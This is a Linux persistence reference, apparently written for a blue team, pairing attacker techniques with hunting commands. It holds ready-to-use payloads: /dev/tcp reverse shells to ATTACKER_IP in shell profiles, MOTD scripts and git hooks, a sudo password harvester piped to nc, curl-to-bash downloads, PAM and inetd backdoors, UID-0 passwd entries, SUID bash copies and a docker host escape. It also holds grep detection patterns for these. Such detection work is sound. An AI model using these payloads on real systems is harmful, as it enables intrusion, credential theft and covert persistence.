# Linux Persistence Techniques Reference

Additional persistence methods beyond what's in quals_script.sh.
Shows what each technique looks like so blue team knows what to hunt.

---

## 1. LD_PRELOAD Hijacking
Loads a malicious shared library before all others for every process.

**Install:**
```bash
echo "/lib/x86_64-linux-gnu/libsystem.so" > /etc/ld.so.preload
# or
echo "/usr/lib/libpthread_helper.so" > /etc/ld.so.preload
```

**What the .so might do:**
- Hook `pam_authenticate()` to log/bypass passwords
- Hook `accept()` to create backdoor on specific port
- Hook `readdir()` to hide files from `ls`

**Hunt:**
```bash
cat /etc/ld.so.preload
echo $LD_PRELOAD
grep -r LD_PRELOAD /etc/environment /etc/profile.d/ ~/.bashrc
```

---

## 2. PAM Backdoor
Modified PAM module that accepts a hardcoded password for any user.

**What it looks like in PAM config:**
```
# /etc/pam.d/common-auth or /etc/pam.d/system-auth
auth    sufficient    pam_backdoor.so
auth    [success=1 default=ignore]    pam_unix.so nullok_secure use_first_pass
```

**Hunt:**
```bash
# Look for unexpected PAM modules
grep -r "sufficient" /etc/pam.d/
# Check module timestamps - backdoor will be newer
ls -la /lib/x86_64-linux-gnu/security/*.so
ls -la /lib64/security/*.so
# Verify package integrity
debsums libpam-modules 2>/dev/null
rpm -V pam 2>/dev/null
```

---

## 3. Bashrc/Profile Injection
Code injected into shell startup files runs on every login/shell open.

**Common locations:**
```
/etc/profile
/etc/profile.d/*.sh
/etc/bash.bashrc
~/.bashrc
~/.bash_profile
~/.profile
~/.zshrc
```

**Example payloads:**
```bash
# Reverse shell on login
(bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &)

# Credential harvester
alias sudo='sudo_wrapper'
sudo_wrapper() { read -sp "[sudo] password for $USER: " pass; echo "$USER:$pass" | nc ATTACKER_IP PORT; echo; command sudo -S <<< "$pass" "$@"; }

# Download and execute
curl -s http://ATTACKER/payload.sh | bash &
```

**Hunt:**
```bash
# Check all profile files for suspicious content
grep -rn "dev/tcp\|mkfifo\|nc \|curl.*bash\|wget.*bash\|base64" /etc/profile /etc/profile.d/ /etc/bash.bashrc /home/*/.bashrc /home/*/.profile /root/.bashrc 2>/dev/null
```

---

## 4. MOTD (Message of the Day) Scripts
Scripts in `/etc/update-motd.d/` run as root on every SSH login.

**Example:**
```bash
# /etc/update-motd.d/00-header (or any file here)
#!/bin/bash
# Original MOTD content...
(bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &) 2>/dev/null
```

**Hunt:**
```bash
ls -la /etc/update-motd.d/
cat /etc/update-motd.d/*
# Check for pipes, sockets, network calls
grep -rn "dev/tcp\|nc \|curl\|wget\|python" /etc/update-motd.d/
```

---

## 5. Systemd Timer (Cron Alternative)
Harder to find than crontabs, often overlooked.

**Example:**
```ini
# /etc/systemd/system/update-check.timer
[Unit]
Description=System Update Check

[Timer]
OnBootSec=2min
OnUnitActiveSec=15min

[Install]
WantedBy=timers.target
```

```ini
# /etc/systemd/system/update-check.service
[Unit]
Description=System Update Check

[Service]
Type=oneshot
ExecStart=/usr/local/bin/update-check.sh
```

**Hunt:**
```bash
systemctl list-timers --all
find /etc/systemd/ /usr/lib/systemd/ -name "*.timer" -mtime -30
```

---

## 6. inetd/xinetd Backdoor
Listens on a port and spawns a shell on connection.

**Example (/etc/inetd.conf):**
```
31337 stream tcp nowait root /bin/bash bash -i
```

**Example (/etc/xinetd.d/backdoor):**
```
service backdoor
{
    type = UNLISTED
    port = 31337
    socket_type = stream
    protocol = tcp
    wait = no
    user = root
    server = /bin/bash
    server_args = -i
}
```

**Hunt:**
```bash
cat /etc/inetd.conf 2>/dev/null
ls -la /etc/xinetd.d/
grep -rn "bin/bash\|bin/sh" /etc/xinetd.d/ /etc/inetd.conf 2>/dev/null
```

---

## 7. Modified /etc/passwd (No Shadow Entry Needed)
A password hash directly in /etc/passwd bypasses /etc/shadow.

**Example:**
```
# Normal entry (password in /etc/shadow):
root:x:0:0:root:/root:/bin/bash

# Backdoor entry (password hash inline, UID 0):
tty0:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash
sysadm:$6$salt$hash:0:0::/root:/bin/bash
```

**Hunt:**
```bash
# Find UID 0 accounts
awk -F: '$3 == 0 {print}' /etc/passwd
# Find entries with password hash instead of 'x'
awk -F: '$2 != "x" && $2 != "*" && $2 != "!" && $2 != "" {print}' /etc/passwd
```

---

## 8. Kernel Module Rootkits

### Reptile (kernel <= 4.x)
- Hides files, processes, network connections
- Hidden backdoor user in /etc/passwd between `#<reptile>` tags
- Loads via `/lib/udev/` or systemd service

### Diamorphine
- `kill -64 <PID>` to hide/unhide a process
- `kill -63 0` to toggle root
- Hidden kernel module (won't show in `lsmod`)

### Singularity (kernel 5.x+, ftrace-based)
- Uses ftrace hooks instead of syscall table modification
- Persistence via systemd journal service
- Requires `kernel.ftrace_enabled=1`

**Hunt:**
```bash
# Check loaded modules
lsmod
# Look for ftrace state
cat /proc/sys/kernel/ftrace_enabled
cat /sys/kernel/debug/tracing/enabled_functions 2>/dev/null
# Check for hidden modules (compare lsmod vs /proc/modules)
diff <(lsmod | awk '{print $1}' | sort) <(cat /proc/modules | awk '{print $1}' | sort)
# Check dmesg for module load messages
dmesg | grep -i "module\|insmod\|loaded"
# Look for reptile markers
grep -n "reptile" /etc/passwd
```

---

## 9. Backdoor Binary Replacement
Replace legitimate binaries with trojaned versions.

**Common targets from quals_script.sh:**
```bash
# SUID bash copy disguised as ssh-keygen
cp $(which bash) /usr/lib/openssh/ssh-keygen
chmod u+s /usr/lib/openssh/ssh-keygen

# SUID on ip and chroot
chmod u+s $(which ip) $(which chroot)
```

**Hunt:**
```bash
# Full SUID scan
find / -perm -4000 -type f 2>/dev/null

# Verify package file integrity
debsums -c 2>/dev/null    # Debian/Ubuntu
rpm -Va 2>/dev/null        # RHEL/CentOS

# Check if a binary is actually what it claims
file /usr/lib/openssh/ssh-keygen
# If it says "ELF ... dynamically linked" and it's actually bash, that's a backdoor
```

---

## 10. Git Hook Persistence
If the target runs git operations, hooks in repos auto-execute.

**Example (.git/hooks/post-checkout):**
```bash
#!/bin/bash
(bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &) 2>/dev/null
```

**Hunt:**
```bash
find / -path "*/.git/hooks/*" -executable -type f 2>/dev/null
```

---

## 11. Docker Socket Abuse
If docker is available, mount host filesystem for persistence.

```bash
docker run -v /:/host -it alpine chroot /host bash
# Now you have root on the host, can add persistence normally
```

**Hunt:**
```bash
# Check who can access docker socket
ls -la /var/run/docker.sock
# Check running containers
docker ps -a 2>/dev/null
# Look for host mounts
docker inspect $(docker ps -q) 2>/dev/null | grep -A5 "Mounts"
```